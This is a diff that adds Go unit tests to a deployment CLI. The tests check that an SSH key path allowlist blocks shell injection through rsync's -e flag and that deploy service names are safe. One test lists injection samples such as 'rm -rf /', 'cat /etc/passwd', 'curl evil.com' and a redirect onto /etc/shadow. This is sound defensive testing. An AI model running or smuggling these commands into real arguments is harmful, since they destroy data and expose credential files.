@@ -8,6 +8,73 @@ import (
 	"github.com/nself-org/cli/internal/controlplane"
 )
 
+// ── T01 — SSH shell injection hardening ───────────────────────────────────────
+
+// TestSSHKeyRe_SafePath verifies that a clean, safe SSH key path passes the
+// allowlist regex.
+func TestSSHKeyRe_SafePath(t *testing.T) {
+	safePaths := []string{
+		"/home/user/.ssh/id_ed25519",
+		"~/.ssh/nself_deploy",
+		"/root/.ssh/id_rsa",
+		"/tmp/key.pem",
+	}
+	for _, p := range safePaths {
+		if !sshKeyRe.MatchString(p) {
+			t.Errorf("sshKeyRe rejected safe path %q — should be allowed", p)
+		}
+	}
+}
+
+// TestSSHKeyRe_InjectionBlocked verifies that shell metacharacters in the SSH
+// key path are rejected by the sshKeyRe allowlist, preventing shell injection
+// via the rsync -e flag string construction.
+//
+// Security context: the key path is interpolated into
+//
+//	rsync -e "ssh -i <keyPath> ..."
+//
+// A backtick or $(...) in keyPath would be shell-executed by rsync's -e
+// parsing. The allowlist regex must reject these before they reach rsync.
+func TestSSHKeyRe_InjectionBlocked(t *testing.T) {
+	injectionPaths := []string{
+		"`id`",                       // backtick execution
+		"$(id)",                      // $() substitution
+		"/tmp/key;rm -rf /",          // semicolon chaining
+		"/tmp/key|cat /etc/passwd",   // pipe
+		"/tmp/key && curl evil.com",  // AND chaining
+		"/tmp/key\necho injected",    // newline
+		"/tmp/key > /etc/shadow",     // redirect
+	}
+	for _, p := range injectionPaths {
+		if sshKeyRe.MatchString(p) {
+			t.Errorf("sshKeyRe accepted injection payload %q — SECURITY BUG: shell injection possible via rsync -e", p)
+		}
+	}
+}
+
+// TestDeployServiceOrder_AllSafeNames verifies that every service name in the
+// hardcoded deployServiceOrder allowlist consists only of safe alphanumeric +
+// hyphen characters — no shell metacharacters that could be injected into the
+// remote SSH command "cd <path> && docker compose up -d <svc>".
+//
+// Security context: deployServiceOrder is a compile-time constant (not user
+// input), but this test documents and locks down the invariant so that any
+// future edit that adds an unsafe service name fails loudly.
+func TestDeployServiceOrder_AllSafeNames(t *testing.T) {
+	for _, svc := range deployServiceOrder {
+		if !remotePathRe.MatchString(svc) && !strings.ContainsAny(svc, "-") {
+			t.Errorf("service name %q contains unsafe characters for SSH remote command embedding", svc)
+		}
+		// Additional strict check: no whitespace, no shell metacharacters.
+		for _, ch := range svc {
+			if (ch < 'a' || ch > 'z') && (ch < 'A' || ch > 'Z') && (ch < '0' || ch > '9') && ch != '-' && ch != '_' {
+				t.Errorf("service name %q contains character %q not safe for SSH command injection", svc, ch)
+			}
+		}
+	}
+}
+
 // ── T04 — deploy environments ─────────────────────────────────────────────────
 
 // TestEnvServerRowJSON verifies the stable Admin-contract JSON schema for one
